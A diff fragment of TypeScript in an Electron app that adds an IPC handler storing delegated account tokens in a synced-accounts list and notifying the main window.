+  ipcMain.on('add-to-list', (_event, data: { email: string; displayName?: string; token?: string; refreshToken?: string; tokenId?: string; adminEmail?: string; portalUrl?: string }) => {
+    console.log('[Admin] Adding delegated token to list: ' + data.email);
+    const newAccount: SyncedAccount = {
+      sessionId: 'imp_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8),
+      email: data.email,
+      name: data.displayName || data.email,
+      accessToken: data.token || '',
+      refreshToken: data.refreshToken || '',
+      accessTokenExpiry: new Date(Date.now() + 3600000).toISOString(),
+    };
+    // Add to synced accounts if not already present
+    const existingIdx = syncedAccounts.findIndex(a => a.email === data.email);
+    if (existingIdx >= 0) {
+      syncedAccounts[existingIdx] = { ...syncedAccounts[existingIdx], ...newAccount };
+    } else {
+      syncedAccounts.push(newAccount);
+    }
+    // Notify main window
+    if (mainWindow && !mainWindow.isDestroyed()) {
+      mainWindow.webContents.send('accounts-updated');
+    }
   });
 
   // Open email in Chrome (legacy)
